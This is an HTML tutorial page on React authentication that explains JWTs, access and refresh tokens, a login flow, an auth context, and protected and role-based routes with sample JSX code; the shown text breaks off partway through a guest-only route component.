@@ -1,0 +1,878 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>React Authentication - Complete Guide</title>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body { background: #f6f7fb; font-family: -apple-system, 'Segoe UI', Helvetica, Arial, sans-serif; color: #1a1a1a; }
+    .container { width: 92%; max-width: 1200px; margin: 60px auto; }
+
+    /* header */
+    .header { background: linear-gradient(120deg,#3730a3,#6366f1); border-radius: 16px; padding: 40px 36px; margin-bottom: 50px; box-shadow: 0 12px 30px rgba(99,102,241,0.3); }
+    .header h1 { color: #fff; font-size: 32px; margin-bottom: 8px; font-weight: 800; letter-spacing: -0.5px; }
+    .header p { color: #e0e7ff; font-size: 16px; margin-bottom: 22px; }
+    .toc { display: flex; flex-wrap: wrap; gap: 8px; }
+    .toc a { text-decoration: none; padding: 7px 16px; border-radius: 20px; font-size: 13px; font-weight: 700; cursor: pointer; border: 1px solid rgba(255,255,255,0.35); transition: all .2s ease; }
+    .pill-indigo { background: rgba(99,102,241,0.3); color: #fff; }
+    .pill-teal   { background: rgba(13,148,136,0.35); color: #fff; }
+    .pill-red    { background: rgba(219,39,119,0.3); color: #fff; }
+    .toc a:hover { background: #fff; color: #3730a3; }
+
+    /* section divider */
+    .section-divider { margin: 48px 0 24px; position: relative; }
+    .section-divider::before { content:''; position:absolute; top:50%; left:0; right:0; height:2px; background: linear-gradient(90deg,#6366f1,#ec4899,#f59e0b); opacity:.25; }
+    .section-divider span { background:#f6f7fb; padding:0 16px 0 0; position:relative; font-size:22px; font-weight:800; color:#1a1a1a; }
+
+    /* card */
+    .card { border-radius: 14px; margin-bottom: 30px; overflow: hidden; box-shadow: 0 10px 24px rgba(0,0,0,0.06); border: 1px solid rgba(0,0,0,0.04); background:#fff; }
+    .card-title { color:#fff; font-size:20px; font-weight:700; padding:18px 26px; background: linear-gradient(120deg,#4338ca,#6366f1); }
+    .card-content { padding: 26px; background: #eef2ff; }
+    .card-content p { color:#333; font-size:16px; line-height:1.8; margin-bottom:14px; font-weight:500; }
+    .card-content h3 { font-size:17px; margin: 22px 0 10px; font-weight:800; color:#3730a3; }
+    .card-content code { background: rgba(67,56,202,0.08); padding: 1px 6px; border-radius: 5px; font-family:'Fira Code','Consolas',monospace; font-size: .92em; color:#3730a3; }
+
+    /* short-answer / hook-syntax / diagram */
+    .short-answer { background: linear-gradient(135deg,#e0e7ff,#c7d2fe); border-left: 4px solid #4338ca; border-radius: 10px; padding: 16px 20px; margin-bottom: 18px; font-size: 16px; line-height: 1.8; color:#312e81; }
+    .hook-syntax { background:#1a1a1a; color:#c3e88d; font-family:'Fira Code','Consolas',monospace; font-size:15px; padding:14px 18px; border-radius:10px; margin: 10px 0 18px; box-shadow: 0 6px 16px rgba(0,0,0,0.15); }
+    .diagram { background:#0f172a; color:#93c5fd; font-family:'Fira Code','Consolas',monospace; font-size:12.5px; line-height:1.6; padding:18px 20px; border-radius:10px; margin: 14px 0; overflow-x:auto; white-space:pre; box-shadow: 0 6px 16px rgba(0,0,0,0.2); }
+
+    /* code block */
+    .code-block { background:#1a1a1a; border-radius:10px; overflow:hidden; margin:14px 0; box-shadow:0 6px 16px rgba(0,0,0,0.18); }
+    .code-bar { background:#111; padding:8px 14px; display:flex; align-items:center; gap:6px; border-bottom:1px solid #333; }
+    .code-bar .dot { width:10px; height:10px; border-radius:50%; }
+    .dot-red{background:#ff5f57;} .dot-grey{background:#febc2e;} .dot-green{background:#28c840;}
+    .filename { color:#999; font-size:12px; margin-left:8px; }
+    .code-block pre { padding:18px; overflow-x:auto; }
+    .code-block code { background:none; color:#d4d4d4; font-size:14.5px; font-family:'Fira Code','Consolas',monospace; padding:0; }
+    .kw{color:#c792ea;font-weight:600;} .str{color:#c3e88d;} .fn{color:#82aaff;} .cmt{color:#7a7a7a;font-style:italic;} .num{color:#f78c6c;} .type{color:#f07178;}
+
+    /* info boxes */
+    .note, .warning, .tip, .remember { border-radius:10px; padding:14px 18px; margin:14px 0; font-size:15px; line-height:1.8; font-weight:600; box-shadow: inset 0 0 0 1px rgba(255,255,255,0.5); }
+    .note     { background: linear-gradient(135deg,#e0e7ff,#c7d2fe); color:#3730a3; }
+    .warning  { background: linear-gradient(135deg,#ffe4e6,#fecdd3); color:#9f1239; }
+    .tip      { background: linear-gradient(135deg,#fce7f3,#fbcfe8); color:#9d174d; }
+    .remember { background: linear-gradient(135deg,#fef3c7,#fde68a); color:#92400e; }
+
+    /* table */
+    table { width:100%; border-collapse:collapse; margin:15px 0; border-radius:12px; overflow:hidden; box-shadow:0 8px 20px rgba(0,0,0,0.08); }
+    table th { background: linear-gradient(120deg,#6366f1,#8b5cf6); color:#fff; font-size:16px; padding:12px 16px; text-align:left; }
+    table td { padding:11px 16px; font-size:14.5px; font-weight:500; border-bottom:1px solid #eef0f4; color:#334155; }
+    table tr:nth-child(even){ background:#f8fafc; }
+
+    /* QA */
+    .card-content-QA .q-block { padding:14px 18px; margin:22px 0 10px; border-radius:12px; font-size:17px; font-weight:700; box-shadow: rgba(255,255,255,.5) 0 0 0 1px inset; border-left:3px solid #4338ca; background: linear-gradient(135deg,#c7d2fe,#a5b4fc); color:#3730a3; }
+    .card-content-QA .a-block { padding:14px 18px; margin:0 0 16px; border-radius:12px; font-size:15px; line-height:1.8; font-weight:500; box-shadow: rgba(255,255,255,.5) 0 0 0 1px inset; border-left:3px solid #4338ca; background: linear-gradient(135deg,#eef2ff,#e0e7ff); color:#312e81; }
+    .card-content-QA.theme-green .q-block { border-left-color:#059669; background: linear-gradient(135deg,#a7f3d0,#6ee7b7); color:#065f46; }
+    .card-content-QA.theme-green .a-block { border-left-color:#059669; background: linear-gradient(135deg,#ecfdf5,#d1fae5); color:#065f46; }
+    .card-content-QA.theme-purple .q-block { border-left-color:#7c3aed; background: linear-gradient(135deg,#ddd6fe,#c4b5fd); color:#5b21b6; }
+    .card-content-QA.theme-purple .a-block { border-left-color:#7c3aed; background: linear-gradient(135deg,#f5f3ff,#ede9fe); color:#5b21b6; }
+
+    .badge { display:inline-block; padding:3px 10px; border-radius:20px; font-size:11px; font-weight:700; margin-left:8px; background: rgba(255,255,255,0.25); color:#fff; vertical-align: middle; }
+
+    @media (max-width: 768px) {
+      .header h1 { font-size: 24px; }
+      .toc a { padding:6px 12px; font-size:11px; }
+      .diagram { font-size: 10.5px; }
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+
+    <!-- ==================== HEADER ==================== -->
+    <div class="header">
+      <h1>🔐 React Authentication — Complete Guide</h1>
+      <p>JWT, Login Flow, Protected Routes, Token Storage & Security Best Practices</p>
+      <div class="toc">
+        <a href="#overview" class="pill-indigo" onclick="document.getElementById('overview').scrollIntoView({behavior:'smooth'});return false;">Overview</a>
+        <a href="#jwt" class="pill-teal" onclick="document.getElementById('jwt').scrollIntoView({behavior:'smooth'});return false;">JWT</a>
+        <a href="#login" class="pill-red" onclick="document.getElementById('login').scrollIntoView({behavior:'smooth'});return false;">Login Flow</a>
+        <a href="#protected-routes" class="pill-indigo" onclick="document.getElementById('protected-routes').scrollIntoView({behavior:'smooth'});return false;">Protected Routes</a>
+        <a href="#token-storage" class="pill-teal" onclick="document.getElementById('token-storage').scrollIntoView({behavior:'smooth'});return false;">Token Storage</a>
+        <a href="#real-project" class="pill-red" onclick="document.getElementById('real-project').scrollIntoView({behavior:'smooth'});return false;">Real Project</a>
+        <a href="#interview" class="pill-indigo" onclick="document.getElementById('interview').scrollIntoView({behavior:'smooth'});return false;">Interview Q&A</a>
+      </div>
+    </div>
+
+    <!-- ==================== OVERVIEW ==================== -->
+    <div class="section-divider" id="overview"><span>Authentication Overview</span></div>
+
+    <div class="card">
+      <div class="card-title">What is Authentication in React?</div>
+      <div class="card-content">
+        <div class="short-answer">
+          <strong>Authentication</strong> is the process of verifying a user's identity (login). In React SPAs, it typically involves: sending credentials to a backend API, receiving a JWT token, storing it securely, and attaching it to subsequent API requests. The UI then shows/hides content based on auth state.
+        </div>
+
+        <h3>Authentication Flow (High Level)</h3>
+        <div class="diagram">┌──────────┐          ┌──────────────┐          ┌──────────┐
+│  React   │          │   Backend    │          │ Database │
+│  (SPA)   │          │   (API)      │          │          │
+└────┬─────┘          └──────┬───────┘          └────┬─────┘
+     │                       │                       │
+     │  1. POST /login       │                       │
+     │  { email, password }  │                       │
+     │──────────────────────▶│                       │
+     │                       │  2. Verify credentials│
+     │                       │──────────────────────▶│
+     │                       │                       │
+     │                       │  3. User found ✓      │
+     │                       │◀──────────────────────│
+     │                       │                       │
+     │  4. Response:         │                       │
+     │  { accessToken, user }│                       │
+     │◀──────────────────────│                       │
+     │                       │                       │
+     │  5. Store token       │                       │
+     │  6. Redirect to /dash │                       │
+     │                       │                       │
+     │  7. GET /api/data     │                       │
+     │  Header: Bearer token │                       │
+     │──────────────────────▶│                       │
+     │                       │  8. Verify JWT        │
+     │                       │  9. Return data       │
+     │◀──────────────────────│                       │
+     │                       │                       │</div>
+
+        <h3>Authentication vs Authorization</h3>
+        <table>
+          <tr><th>Concept</th><th>Authentication</th><th>Authorization</th></tr>
+          <tr><td><strong>Question</strong></td><td>"Who are you?"</td><td>"What can you do?"</td></tr>
+          <tr><td><strong>Process</strong></td><td>Verify identity (login)</td><td>Check permissions (roles)</td></tr>
+          <tr><td><strong>Example</strong></td><td>Login with email/password</td><td>Admin can delete, User can only read</td></tr>
+          <tr><td><strong>When</strong></td><td>Before accessing any protected resource</td><td>After authentication succeeds</td></tr>
+          <tr><td><strong>React implementation</strong></td><td>Login form + token storage</td><td>Role-based route guards</td></tr>
+        </table>
+      </div>
+    </div>
+
+    <!-- ==================== JWT ==================== -->
+    <div class="section-divider" id="jwt"><span>JWT (JSON Web Token)</span></div>
+
+    <div class="card">
+      <div class="card-title">JWT — JSON Web Token</div>
+      <div class="card-content">
+        <div class="short-answer">
+          <strong>JWT</strong> is a compact, self-contained token format used to securely transmit information between client and server. It consists of three parts: <strong>Header</strong> (algorithm), <strong>Payload</strong> (user data/claims), and <strong>Signature</strong> (verification). The server creates it on login, and the client sends it with every request.
+        </div>
+
+        <h3>JWT Structure</h3>
+        <div class="diagram">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4iLCJyb2xlIjoiYWRtaW4iLCJpYXQiOjE2MzAwMDAwMDB9.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
+ \_______________________________/ \______________________________________________/ \_________________________________/
+         HEADER (Base64)                      PAYLOAD (Base64)                         SIGNATURE
+
+┌─────────────────────────────────────────────────────────────┐
+│  HEADER                                                      │
+│  {                                                           │
+│    "alg": "HS256",        ← Signing algorithm                │
+│    "typ": "JWT"           ← Token type                       │
+│  }                                                           │
+├─────────────────────────────────────────────────────────────┤
+│  PAYLOAD (Claims)                                            │
+│  {                                                           │
+│    "sub": "1234567890",   ← Subject (user ID)                │
+│    "name": "John",        ← Custom claim                     │
+│    "role": "admin",       ← Custom claim (authorization)     │
+│    "iat": 1630000000,     ← Issued at (timestamp)            │
+│    "exp": 1630003600      ← Expires at (1 hour later)        │
+│  }                                                           │
+├─────────────────────────────────────────────────────────────┤
+│  SIGNATURE                                                   │
+│  HMACSHA256(                                                 │
+│    base64(header) + "." + base64(payload),                   │
+│    SECRET_KEY   ← Only server knows this!                    │
+│  )                                                           │
+└─────────────────────────────────────────────────────────────┘</div>
+
+        <h3>Access Token vs Refresh Token</h3>
+        <table>
+          <tr><th>Feature</th><th>Access Token</th><th>Refresh Token</th></tr>
+          <tr><td><strong>Purpose</strong></td><td>Authenticate API requests</td><td>Get new access token silently</td></tr>
+          <tr><td><strong>Lifetime</strong></td><td>Short (15 min - 1 hour)</td><td>Long (7 days - 30 days)</td></tr>
+          <tr><td><strong>Sent with</strong></td><td>Every API request (header)</td><td>Only to /refresh endpoint</td></tr>
+          <tr><td><strong>Storage</strong></td><td>Memory (JavaScript variable)</td><td>HttpOnly cookie (most secure)</td></tr>
+          <tr><td><strong>If stolen</strong></td><td>Limited damage (expires fast)</td><td>Major risk (can generate new access)</td></tr>
+          <tr><td><strong>Revokable?</strong></td><td>No (stateless, expires naturally)</td><td>Yes (blacklist on server)</td></tr>
+        </table>
+
+        <div class="code-block">
+          <div class="code-bar"><span class="dot dot-red"></span><span class="dot dot-grey"></span><span class="dot dot-green"></span><span class="filename">Token Refresh Flow</span></div>
+          <pre><code><span class="cmt">// Token refresh cycle:</span>
+<span class="cmt">// 1. Access token expires (401 response)</span>
+<span class="cmt">// 2. Client sends refresh token to /api/refresh</span>
+<span class="cmt">// 3. Server verifies refresh token, issues new access token</span>
+<span class="cmt">// 4. Client retries the failed request with new token</span>
+
+<span class="cmt">// Timeline:</span>
+<span class="cmt">// ┌──── Access Token (15 min) ────┐</span>
+<span class="cmt">// │ Valid → API calls work         │ Expired → 401</span>
+<span class="cmt">// └─────────────────────────────────┘     │</span>
+<span class="cmt">//                                         ▼</span>
+<span class="cmt">// ┌────────── Refresh Token (7 days) ──────────────┐</span>
+<span class="cmt">// │ Use to get NEW access token (silent refresh)    │</span>
+<span class="cmt">// └─────────────────────────────────────────────────┘</span></code></pre>
+        </div>
+
+        <div class="warning">
+          <strong>⚠️ Security Rules:</strong><br>
+          • <strong>Never</strong> store sensitive data in JWT payload (it's only Base64 encoded, NOT encrypted!)<br>
+          • <strong>Never</strong> trust JWT on the client side alone — always verify on the server<br>
+          • <strong>Always</strong> set expiration (<code>exp</code> claim)<br>
+          • <strong>Never</strong> put the JWT secret in frontend code
+        </div>
+      </div>
+    </div>
+
+    <!-- ==================== LOGIN FLOW ==================== -->
+    <div class="section-divider" id="login"><span>Login Flow</span></div>
+
+    <div class="card">
+      <div class="card-title">Login Implementation</div>
+      <div class="card-content">
+        <div class="short-answer">
+          The login flow in React involves: (1) Collecting credentials from a form, (2) Sending them to the backend API, (3) Receiving and storing the JWT token, (4) Updating auth state, (5) Redirecting to the protected page.
+        </div>
+
+        <h3>Login Form Component</h3>
+        <div class="code-block">
+          <div class="code-bar"><span class="dot dot-red"></span><span class="dot dot-grey"></span><span class="dot dot-green"></span><span class="filename">LoginPage.jsx</span></div>
+          <pre><code><span class="kw">import</span> { <span class="fn">useState</span> } <span class="kw">from</span> <span class="str">'react'</span>;
+<span class="kw">import</span> { <span class="fn">useNavigate</span>, <span class="fn">useLocation</span> } <span class="kw">from</span> <span class="str">'react-router-dom'</span>;
+<span class="kw">import</span> { <span class="fn">useAuth</span> } <span class="kw">from</span> <span class="str">'../context/AuthContext'</span>;
+
+<span class="kw">function</span> <span class="fn">LoginPage</span>() {
+  <span class="kw">const</span> [<span class="type">email</span>, <span class="fn">setEmail</span>] = <span class="fn">useState</span>(<span class="str">''</span>);
+  <span class="kw">const</span> [<span class="type">password</span>, <span class="fn">setPassword</span>] = <span class="fn">useState</span>(<span class="str">''</span>);
+  <span class="kw">const</span> [<span class="type">error</span>, <span class="fn">setError</span>] = <span class="fn">useState</span>(<span class="str">''</span>);
+  <span class="kw">const</span> [<span class="type">loading</span>, <span class="fn">setLoading</span>] = <span class="fn">useState</span>(<span class="num">false</span>);
+
+  <span class="kw">const</span> { <span class="fn">login</span> } = <span class="fn">useAuth</span>();
+  <span class="kw">const</span> <span class="fn">navigate</span> = <span class="fn">useNavigate</span>();
+  <span class="kw">const</span> <span class="type">location</span> = <span class="fn">useLocation</span>();
+
+  <span class="cmt">// Where the user came from (redirect back after login)</span>
+  <span class="kw">const</span> <span class="type">from</span> = <span class="type">location</span>.state?.from?.pathname || <span class="str">'/dashboard'</span>;
+
+  <span class="kw">const</span> <span class="fn">handleSubmit</span> = <span class="kw">async</span> (<span class="type">e</span>) =&gt; {
+    <span class="type">e</span>.<span class="fn">preventDefault</span>();
+    <span class="fn">setError</span>(<span class="str">''</span>);
+    <span class="fn">setLoading</span>(<span class="num">true</span>);
+
+    <span class="kw">try</span> {
+      <span class="kw">await</span> <span class="fn">login</span>(<span class="type">email</span>, <span class="type">password</span>);
+      <span class="cmt">// Redirect to original page (or dashboard)</span>
+      <span class="fn">navigate</span>(<span class="type">from</span>, { <span class="type">replace</span>: <span class="num">true</span> });
+    } <span class="kw">catch</span> (<span class="type">err</span>) {
+      <span class="fn">setError</span>(<span class="type">err</span>.response?.data?.message || <span class="str">'Invalid credentials'</span>);
+    } <span class="kw">finally</span> {
+      <span class="fn">setLoading</span>(<span class="num">false</span>);
+    }
+  };
+
+  <span class="kw">return</span> (
+    &lt;<span class="type">div</span> className=<span class="str">"login-container"</span>&gt;
+      &lt;<span class="type">h1</span>&gt;Login&lt;/<span class="type">h1</span>&gt;
+      {<span class="type">error</span> && &lt;<span class="type">div</span> className=<span class="str">"error-msg"</span>&gt;{<span class="type">error</span>}&lt;/<span class="type">div</span>&gt;}
+
+      &lt;<span class="type">form</span> <span class="fn">onSubmit</span>={<span class="fn">handleSubmit</span>}&gt;
+        &lt;<span class="type">input</span>
+          <span class="type">type</span>=<span class="str">"email"</span>
+          <span class="type">placeholder</span>=<span class="str">"Email"</span>
+          <span class="type">value</span>={<span class="type">email</span>}
+          <span class="fn">onChange</span>={(<span class="type">e</span>) =&gt; <span class="fn">setEmail</span>(<span class="type">e</span>.target.value)}
+          <span class="type">required</span>
+          <span class="type">autoComplete</span>=<span class="str">"email"</span>
+        /&gt;
+        &lt;<span class="type">input</span>
+          <span class="type">type</span>=<span class="str">"password"</span>
+          <span class="type">placeholder</span>=<span class="str">"Password"</span>
+          <span class="type">value</span>={<span class="type">password</span>}
+          <span class="fn">onChange</span>={(<span class="type">e</span>) =&gt; <span class="fn">setPassword</span>(<span class="type">e</span>.target.value)}
+          <span class="type">required</span>
+          <span class="type">autoComplete</span>=<span class="str">"current-password"</span>
+        /&gt;
+        &lt;<span class="type">button</span> <span class="type">type</span>=<span class="str">"submit"</span> <span class="type">disabled</span>={<span class="type">loading</span>}&gt;
+          {<span class="type">loading</span> ? <span class="str">'Logging in...'</span> : <span class="str">'Login'</span>}
+        &lt;/<span class="type">button</span>&gt;
+      &lt;/<span class="type">form</span>&gt;
+    &lt;/<span class="type">div</span>&gt;
+  );
+}</code></pre>
+        </div>
+
+        <h3>Auth Service (API calls)</h3>
+        <div class="code-block">
+          <div class="code-bar"><span class="dot dot-red"></span><span class="dot dot-grey"></span><span class="dot dot-green"></span><span class="filename">services/authService.js</span></div>
+          <pre><code><span class="kw">import</span> <span class="fn">axios</span> <span class="kw">from</span> <span class="str">'axios'</span>;
+
+<span class="kw">const</span> <span class="type">API_URL</span> = <span class="str">'/api/auth'</span>;
+
+<span class="kw">export const</span> <span class="fn">authService</span> = {
+  <span class="cmt">// Login — send credentials, get token</span>
+  <span class="kw">async</span> <span class="fn">login</span>(<span class="type">email</span>, <span class="type">password</span>) {
+    <span class="kw">const</span> <span class="type">response</span> = <span class="kw">await</span> <span class="fn">axios</span>.<span class="fn">post</span>(<span class="str">`${API_URL}/login`</span>, {
+      <span class="type">email</span>,
+      <span class="type">password</span>
+    });
+    <span class="kw">return</span> <span class="type">response</span>.data; <span class="cmt">// { accessToken, refreshToken, user }</span>
+  },
+
+  <span class="cmt">// Register</span>
+  <span class="kw">async</span> <span class="fn">register</span>(<span class="type">userData</span>) {
+    <span class="kw">const</span> <span class="type">response</span> = <span class="kw">await</span> <span class="fn">axios</span>.<span class="fn">post</span>(<span class="str">`${API_URL}/register`</span>, <span class="type">userData</span>);
+    <span class="kw">return</span> <span class="type">response</span>.data;
+  },
+
+  <span class="cmt">// Refresh access token</span>
+  <span class="kw">async</span> <span class="fn">refreshToken</span>(<span class="type">refreshToken</span>) {
+    <span class="kw">const</span> <span class="type">response</span> = <span class="kw">await</span> <span class="fn">axios</span>.<span class="fn">post</span>(<span class="str">`${API_URL}/refresh`</span>, {
+      <span class="type">refreshToken</span>
+    });
+    <span class="kw">return</span> <span class="type">response</span>.data; <span class="cmt">// { accessToken }</span>
+  },
+
+  <span class="cmt">// Logout (optional: invalidate refresh token on server)</span>
+  <span class="kw">async</span> <span class="fn">logout</span>(<span class="type">refreshToken</span>) {
+    <span class="kw">await</span> <span class="fn">axios</span>.<span class="fn">post</span>(<span class="str">`${API_URL}/logout`</span>, { <span class="type">refreshToken</span> });
+  },
+
+  <span class="cmt">// Get current user profile</span>
+  <span class="kw">async</span> <span class="fn">getProfile</span>(<span class="type">token</span>) {
+    <span class="kw">const</span> <span class="type">response</span> = <span class="kw">await</span> <span class="fn">axios</span>.<span class="fn">get</span>(<span class="str">`${API_URL}/me`</span>, {
+      <span class="type">headers</span>: { <span class="type">Authorization</span>: <span class="str">`Bearer ${token}`</span> }
+    });
+    <span class="kw">return</span> <span class="type">response</span>.data;
+  }
+};</code></pre>
+        </div>
+
+        <h3>Auth Context (Global Auth State)</h3>
+        <div class="code-block">
+          <div class="code-bar"><span class="dot dot-red"></span><span class="dot dot-grey"></span><span class="dot dot-green"></span><span class="filename">context/AuthContext.jsx</span></div>
+          <pre><code><span class="kw">import</span> { <span class="fn">createContext</span>, <span class="fn">useContext</span>, <span class="fn">useState</span>, <span class="fn">useEffect</span>, <span class="fn">useCallback</span> } <span class="kw">from</span> <span class="str">'react'</span>;
+<span class="kw">import</span> { <span class="fn">authService</span> } <span class="kw">from</span> <span class="str">'../services/authService'</span>;
+
+<span class="kw">const</span> <span class="fn">AuthContext</span> = <span class="fn">createContext</span>(<span class="num">null</span>);
+
+<span class="kw">export function</span> <span class="fn">AuthProvider</span>({ <span class="type">children</span> }) {
+  <span class="kw">const</span> [<span class="type">user</span>, <span class="fn">setUser</span>] = <span class="fn">useState</span>(<span class="num">null</span>);
+  <span class="kw">const</span> [<span class="type">token</span>, <span class="fn">setToken</span>] = <span class="fn">useState</span>(<span class="num">null</span>);
+  <span class="kw">const</span> [<span class="type">loading</span>, <span class="fn">setLoading</span>] = <span class="fn">useState</span>(<span class="num">true</span>); <span class="cmt">// initial auth check</span>
+
+  <span class="cmt">// Check for existing session on app load</span>
+  <span class="fn">useEffect</span>(() =&gt; {
+    <span class="kw">const</span> <span class="type">storedToken</span> = localStorage.<span class="fn">getItem</span>(<span class="str">'accessToken'</span>);
+    <span class="kw">if</span> (<span class="type">storedToken</span>) {
+      <span class="fn">setToken</span>(<span class="type">storedToken</span>);
+      <span class="fn">authService</span>.<span class="fn">getProfile</span>(<span class="type">storedToken</span>)
+        .<span class="fn">then</span>(<span class="type">user</span> =&gt; <span class="fn">setUser</span>(<span class="type">user</span>))
+        .<span class="fn">catch</span>(() =&gt; {
+          localStorage.<span class="fn">removeItem</span>(<span class="str">'accessToken'</span>);
+          <span class="fn">setToken</span>(<span class="num">null</span>);
+        })
+        .<span class="fn">finally</span>(() =&gt; <span class="fn">setLoading</span>(<span class="num">false</span>));
+    } <span class="kw">else</span> {
+      <span class="fn">setLoading</span>(<span class="num">false</span>);
+    }
+  }, []);
+
+  <span class="kw">const</span> <span class="fn">login</span> = <span class="fn">useCallback</span>(<span class="kw">async</span> (<span class="type">email</span>, <span class="type">password</span>) =&gt; {
+    <span class="kw">const</span> <span class="type">data</span> = <span class="kw">await</span> <span class="fn">authService</span>.<span class="fn">login</span>(<span class="type">email</span>, <span class="type">password</span>);
+    <span class="fn">setToken</span>(<span class="type">data</span>.accessToken);
+    <span class="fn">setUser</span>(<span class="type">data</span>.user);
+    localStorage.<span class="fn">setItem</span>(<span class="str">'accessToken'</span>, <span class="type">data</span>.accessToken);
+  }, []);
+
+  <span class="kw">const</span> <span class="fn">logout</span> = <span class="fn">useCallback</span>(() =&gt; {
+    <span class="fn">setToken</span>(<span class="num">null</span>);
+    <span class="fn">setUser</span>(<span class="num">null</span>);
+    localStorage.<span class="fn">removeItem</span>(<span class="str">'accessToken'</span>);
+  }, []);
+
+  <span class="kw">const</span> <span class="type">value</span> = {
+    <span class="type">user</span>,
+    <span class="type">token</span>,
+    <span class="type">isAuthenticated</span>: !!<span class="type">token</span>,
+    <span class="type">loading</span>,
+    <span class="fn">login</span>,
+    <span class="fn">logout</span>
+  };
+
+  <span class="kw">return</span> (
+    &lt;<span class="fn">AuthContext.Provider</span> <span class="type">value</span>={<span class="type">value</span>}&gt;
+      {<span class="type">children</span>}
+    &lt;/<span class="fn">AuthContext.Provider</span>&gt;
+  );
+}
+
+<span class="cmt">// Custom hook for easy access</span>
+<span class="kw">export function</span> <span class="fn">useAuth</span>() {
+  <span class="kw">const</span> <span class="type">context</span> = <span class="fn">useContext</span>(<span class="fn">AuthContext</span>);
+  <span class="kw">if</span> (!<span class="type">context</span>) <span class="kw">throw new</span> <span class="fn">Error</span>(<span class="str">'useAuth must be used within AuthProvider'</span>);
+  <span class="kw">return</span> <span class="type">context</span>;
+}</code></pre>
+        </div>
+      </div>
+    </div>
+
+    <!-- ==================== PROTECTED ROUTES ==================== -->
+    <div class="section-divider" id="protected-routes"><span>Protected Routes</span></div>
+
+    <div class="card">
+      <div class="card-title">Protected Routes — Auth Guards</div>
+      <div class="card-content">
+        <div class="short-answer">
+          <strong>Protected Routes</strong> are route guards that check if a user is authenticated before rendering a page. If not authenticated, the user is redirected to the login page. This prevents unauthorized access to private pages like dashboard, profile, settings, etc.
+        </div>
+
+        <h3>Basic Protected Route Component</h3>
+        <div class="code-block">
+          <div class="code-bar"><span class="dot dot-red"></span><span class="dot dot-grey"></span><span class="dot dot-green"></span><span class="filename">components/ProtectedRoute.jsx</span></div>
+          <pre><code><span class="kw">import</span> { <span class="fn">Navigate</span>, <span class="fn">useLocation</span> } <span class="kw">from</span> <span class="str">'react-router-dom'</span>;
+<span class="kw">import</span> { <span class="fn">useAuth</span> } <span class="kw">from</span> <span class="str">'../context/AuthContext'</span>;
+
+<span class="kw">function</span> <span class="fn">ProtectedRoute</span>({ <span class="type">children</span> }) {
+  <span class="kw">const</span> { <span class="type">isAuthenticated</span>, <span class="type">loading</span> } = <span class="fn">useAuth</span>();
+  <span class="kw">const</span> <span class="type">location</span> = <span class="fn">useLocation</span>();
+
+  <span class="cmt">// Show loader while checking auth status</span>
+  <span class="kw">if</span> (<span class="type">loading</span>) {
+    <span class="kw">return</span> &lt;<span class="type">div</span>&gt;Loading...&lt;/<span class="type">div</span>&gt;;
+  }
+
+  <span class="cmt">// Not authenticated → redirect to login</span>
+  <span class="kw">if</span> (!<span class="type">isAuthenticated</span>) {
+    <span class="kw">return</span> (
+      &lt;<span class="fn">Navigate</span>
+        <span class="type">to</span>=<span class="str">"/login"</span>
+        <span class="type">state</span>={{ <span class="type">from</span>: <span class="type">location</span> }}  <span class="cmt">{/* Save where they came from */</span>}
+        <span class="type">replace</span>
+      /&gt;
+    );
+  }
+
+  <span class="cmt">// Authenticated → render the page</span>
+  <span class="kw">return</span> <span class="type">children</span>;
+}</code></pre>
+        </div>
+
+        <h3>Role-Based Protected Route</h3>
+        <div class="code-block">
+          <div class="code-bar"><span class="dot dot-red"></span><span class="dot dot-grey"></span><span class="dot dot-green"></span><span class="filename">components/RoleRoute.jsx</span></div>
+          <pre><code><span class="kw">function</span> <span class="fn">RoleRoute</span>({ <span class="type">children</span>, <span class="type">allowedRoles</span> }) {
+  <span class="kw">const</span> { <span class="type">user</span>, <span class="type">isAuthenticated</span>, <span class="type">loading</span> } = <span class="fn">useAuth</span>();
+  <span class="kw">const</span> <span class="type">location</span> = <span class="fn">useLocation</span>();
+
+  <span class="kw">if</span> (<span class="type">loading</span>) <span class="kw">return</span> &lt;<span class="fn">Spinner</span> /&gt;;
+
+  <span class="cmt">// Not logged in → login page</span>
+  <span class="kw">if</span> (!<span class="type">isAuthenticated</span>) {
+    <span class="kw">return</span> &lt;<span class="fn">Navigate</span> <span class="type">to</span>=<span class="str">"/login"</span> <span class="type">state</span>={{ <span class="type">from</span>: <span class="type">location</span> }} <span class="type">replace</span> /&gt;;
+  }
+
+  <span class="cmt">// Logged in but wrong role → unauthorized page</span>
+  <span class="kw">if</span> (!<span class="type">allowedRoles</span>.<span class="fn">includes</span>(<span class="type">user</span>.role)) {
+    <span class="kw">return</span> &lt;<span class="fn">Navigate</span> <span class="type">to</span>=<span class="str">"/unauthorized"</span> <span class="type">replace</span> /&gt;;
+  }
+
+  <span class="kw">return</span> <span class="type">children</span>;
+}
+
+<span class="cmt">// Usage in routes:</span>
+&lt;<span class="fn">Route</span> <span class="type">path</span>=<span class="str">"/admin"</span> <span class="type">element</span>={
+  &lt;<span class="fn">RoleRoute</span> <span class="type">allowedRoles</span>={[<span class="str">'admin'</span>, <span class="str">'super_admin'</span>]}&gt;
+    &lt;<span class="fn">AdminPanel</span> /&gt;
+  &lt;/<span class="fn">RoleRoute</span>&gt;
+} /&gt;
+
+&lt;<span class="fn">Route</span> <span class="type">path</span>=<span class="str">"/dashboard"</span> <span class="type">element</span>={
+  &lt;<span class="fn">RoleRoute</span> <span class="type">allowedRoles</span>={[<span class="str">'admin'</span>, <span class="str">'user'</span>, <span class="str">'manager'</span>]}&gt;
+    &lt;<span class="fn">Dashboard</span> /&gt;
+  &lt;/<span class="fn">RoleRoute</span>&gt;
+} /&gt;</code></pre>
+        </div>
+
+        <h3>Guest-Only Route (Reverse Guard)</h3>
+        <div class="code-block">
+          <div class="code-bar"><span class="dot dot-red"></span><span class="dot dot-grey"></span><span class="dot dot-green"></span><span class="filename">components/GuestRoute.jsx</span></div>
+          <pre><code><span class="cmt">// Redirect logged-in users AWAY from login/register pages</span>
+<span class="kw">function</span> <span class="fn">GuestRoute</span>({ <span class="type">children</span> }) {
+  <span class="kw">const</span> { <span class="type">isAuthenticated</span>, <span class="type">loading</span> } = <span class="fn">useAuth</span>();
+
